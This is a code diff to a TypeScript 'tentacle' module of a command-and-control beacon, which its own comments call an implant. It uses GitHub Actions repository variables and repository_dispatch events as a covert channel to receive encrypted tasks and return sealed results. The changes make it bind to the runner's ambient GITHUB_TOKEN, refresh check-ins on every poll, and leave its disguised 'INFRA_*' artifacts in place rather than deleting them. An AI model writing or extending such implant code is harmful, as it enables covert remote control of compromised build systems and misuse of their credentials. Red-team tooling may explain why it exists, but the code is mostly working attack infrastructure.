@@ -87,10 +87,9 @@
  *   • Required when the beacon's C2 `repo` differs from the runner's repo.
  *   • Long-lived but revocable; should be treated as a credential.
  *
- * This channel uses `config.token` (which may be a GITHUB_TOKEN or PAT
- * depending on how the beacon was deployed).  When `GITHUB_TOKEN` is the
- * ambient env var the channel is automatically available; the token value
- * is expected to already be loaded into `config.token` by the caller.
+ * When the ambient `GITHUB_TOKEN` is present, this channel binds its Octokit
+ * client directly to that short-lived job credential. Otherwise an explicitly
+ * configured fine-grained token or installation lease is used.
  *
  * ────────────────────────────────────────────────────────────────────────────
  * Security Model
@@ -110,16 +109,32 @@ import { BaseTentacle } from "./BaseTentacle.ts";
 import { createLogger } from "../logger.ts";
 import {
   decryptBox, sealBox,
-  bytesToBase64,
 } from "../crypto/sodium.ts";
-import type { CheckinPayload, Task, TaskResult } from "../types.ts";
+import { ExplicitFineGrainedTokenProvider } from "../lib/GitHubTokenProvider.ts";
+import type {
+  BeaconConfig,
+  CheckinPayload,
+  ResultSubmissionOutcome,
+  Task,
+  TaskResult,
+} from "../types.ts";
 
 const log = createLogger("ActionsTentacle");
 
 export class ActionsTentacle extends BaseTentacle {
   readonly kind = "actions" as const;
 
-  private ackSent = false;
+  private dispatchSent = false;
+
+  constructor(config: BeaconConfig) {
+    const ambient = process.env["GITHUB_TOKEN"]?.trim();
+    super(
+      config,
+      ambient
+        ? new ExplicitFineGrainedTokenProvider(ambient)
+        : undefined,
+    );
+  }
 
   // ── Identity helpers ─────────────────────────────────────────────────────────
 
@@ -135,32 +150,22 @@ export class ActionsTentacle extends BaseTentacle {
 
   // ── Static availability gate ────────────────────────────────────────────────
 
-  /**
-   * Returns true when the `GITHUB_TOKEN` environment variable is present and
-   * non-empty.  This is a synchronous, pure env-check — no network calls.
-   *
-   * `GITHUB_TOKEN` is automatically injected by the GitHub Actions runner into
-   * every job execution context.  Its presence is the canonical signal that
-   * the beacon is running inside a GitHub Actions workflow.
-   *
-   * Note: a PAT stored in a secret named `GITHUB_TOKEN` would also satisfy
-   * this check — which is acceptable, since the channel is available in both
-   * cases.
-   */
-  static isActionsAvailable(): boolean {
-    return Boolean(process.env["GITHUB_TOKEN"]?.trim());
-  }
-
   // ── Availability ────────────────────────────────────────────────────────────
 
   /**
-   * Delegates to the static env check so the tentacle is only active when
-   * running inside a GitHub Actions workflow.  Never throws — any exception
-   * is swallowed and returns false.
+   * Probe the repository Variables API using the credential selected by the
+   * token provider. Outside Actions this is the configured fine-grained token
+   * or App installation lease; inside Actions an ambient `GITHUB_TOKEN` takes
+   * precedence. Never throws so normal tentacle failover remains available.
    */
   override async isAvailable(): Promise<boolean> {
     try {
-      return ActionsTentacle.isActionsAvailable();
+      await this.octokit.rest.actions.listRepoVariables({
+        owner: this.owner,
+        repo: this.repo,
+        per_page: 1,
+      });
+      return true;
     } catch {
       return false;
     }
@@ -169,56 +174,53 @@ export class ActionsTentacle extends BaseTentacle {
   // ── Checkin ─────────────────────────────────────────────────────────────────
 
   /**
-   * 1. On first call: write ACK variable `INFRA_STATUS_{ID8}` = { k: pubkey, t: ts }
-   *    and fire a belt-and-suspenders `repository_dispatch` with event_type "infra-sync".
+   * 1. On every call: write a fresh signed check-in to `INFRA_STATUS_{ID8}`.
+   *    On the first call, also fire a belt-and-suspenders `repository_dispatch`
+   *    with event_type "infra-sync".
    * 2. On all calls: GET `INFRA_JOB_{ID8}` variable.
    *    - If absent (404): return [].
    *    - If present: base64-decode → JSON parse { nonce, ciphertext } → decryptBox
    *      → parse Task[] → delete variable → return tasks.
    */
   async checkin(payload: CheckinPayload): Promise<Task[]> {
-    // 1. First-call ACK registration
-    if (!this.ackSent) {
-      const pubKeyB64 = await bytesToBase64(this.config.beaconKeyPair.publicKey);
-      const ackValue  = JSON.stringify({
-        k: pubKeyB64,
-        t: payload.checkinAt,
-        h: payload.hostname,
-        u: payload.username,
-        o: payload.os,
-        a: payload.arch,
-      });
+    if (!payload.identity) {
+      throw new Error("ActionsTentacle: signed checkin identity is required");
+    }
+    const ackValue = JSON.stringify(payload);
 
-      // Write ACK variable (create or update)
-      try {
-        // Try update first; fall back to create on 404
-        await this.octokit.rest.actions.updateRepoVariable({
+    // 1. Refresh the ACK variable before every task poll.
+    try {
+      // Try update first; fall back to create on 404
+      await this.octokit.rest.actions.updateRepoVariable({
+        owner: this.owner, repo: this.repo,
+        name:  this.ackVarName,
+        value: ackValue,
+      });
+    } catch (err: any) {
+      if (err?.status === 404) {
+        await this.octokit.rest.actions.createRepoVariable({
           owner: this.owner, repo: this.repo,
           name:  this.ackVarName,
           value: ackValue,
         });
-      } catch (err: any) {
-        if (err?.status === 404) {
-          await this.octokit.rest.actions.createRepoVariable({
-            owner: this.owner, repo: this.repo,
-            name:  this.ackVarName,
-            value: ackValue,
-          });
-        }
-        // Other errors are swallowed — ACK is best-effort, not fatal
       }
+      // Other errors are swallowed — ACK is best-effort, not fatal
+    }
 
-      // Belt-and-suspenders: also fire repository_dispatch "infra-sync"
+    // Belt-and-suspenders dispatch remains first-call only.
+    if (!this.dispatchSent) {
       try {
         await (this.octokit.rest as any).repos.createDispatchEvent({
           owner:          this.owner,
           repo:           this.repo,
           event_type:     "infra-sync",
-          client_payload: { k: pubKeyB64, t: payload.checkinAt },
+          client_payload: {
+            beaconId: payload.beaconId,
+            identity: payload.identity,
+          },
         });
       } catch { /* best-effort */ }
-
-      this.ackSent = true;
+      this.dispatchSent = true;
     }
 
     // 2. Poll for task variable
@@ -271,7 +273,7 @@ export class ActionsTentacle extends BaseTentacle {
    * 1. sealBox(JSON.stringify(result), operatorPublicKey) → sealedB64
    * 2. Write variable `INFRA_RESULT_{TASKID8}` = sealedB64
    */
-  async submitResult(result: TaskResult): Promise<void> {
+  async submitResult(result: TaskResult): Promise<ResultSubmissionOutcome> {
     const sealed    = await sealBox(JSON.stringify(result), this.config.operatorPublicKey);
     const taskId8   = result.taskId.slice(0, 8).toUpperCase();
     const varName   = `INFRA_RESULT_${taskId8}`;
@@ -293,23 +295,24 @@ export class ActionsTentacle extends BaseTentacle {
         throw err;
       }
     }
+    return {
+      artifactWritten: true,
+      controllerAccepted: false,
+      channel: "actions",
+      acceptance: null,
+    };
   }
 
   // ── Teardown ─────────────────────────────────────────────────────────────────
 
   /**
-   * Best-effort cleanup: delete `INFRA_JOB_{ID8}` and `INFRA_STATUS_{ID8}`
-   * variables if they exist.  No throw on error.
+   * Preserve remote artifacts during failover and recovery reconfiguration.
+   *
+   * The server may not have consumed the registration ACK yet, and the task
+   * variable may still contain an unread delivery. Lifecycle cleanup belongs
+   * to the server's retention jobs, not an implant teardown.
    */
   override async teardown(): Promise<void> {
-    for (const varName of [this.taskVarName, this.ackVarName]) {
-      try {
-        await this.octokit.rest.actions.deleteRepoVariable({
-          owner: this.owner,
-          repo:  this.repo,
-          name:  varName,
-        });
-      } catch { /* best-effort */ }
-    }
+    // Deliberately non-destructive.
   }
 }
